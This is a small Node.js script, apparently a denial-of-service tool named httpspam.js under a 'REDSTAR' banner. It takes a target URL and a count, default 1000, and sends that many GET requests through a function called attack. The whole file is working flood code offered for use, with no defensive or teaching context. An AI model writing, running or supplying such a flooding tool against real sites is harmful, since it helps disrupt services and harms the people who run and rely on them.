const request = require('request');

function attack(target) {
	var config = {
		method: "GET",
		url: target
	}
	request(config, function (err,response) {
		console.log(response.statusCode, "HTTP_RAW");
	});
}


if (process.argv.length != 4) {
	console.clear();
	console.log(`\x1b[31m    ██████╗ ███████╗██████╗ ███████╗████████╗ █████╗ ██████╗ 
    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
    \x1b[00m██████╔╝█████╗  ██║  ██║███████╗   ██║   ███████║██████╔╝
    ██╔══██╗██╔══╝  ██║  ██║╚════██║   ██║   ██╔══██║██╔══██╗
   \x1b[31m ██║  ██║███████╗██████╔╝███████║   ██║   ██║  ██║██║  ██║
    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝`);
    console.log();
	console.log(`\x1b[34mUsage : httpspam.js <url> <threads(default 1000)>`);
} else {
	console.log();
	targetUrl = process.argv[2];
	threads = process.argv[3];
	
	for (let i = 0; i < threads; i++) {
		attack(targetUrl);
	}
}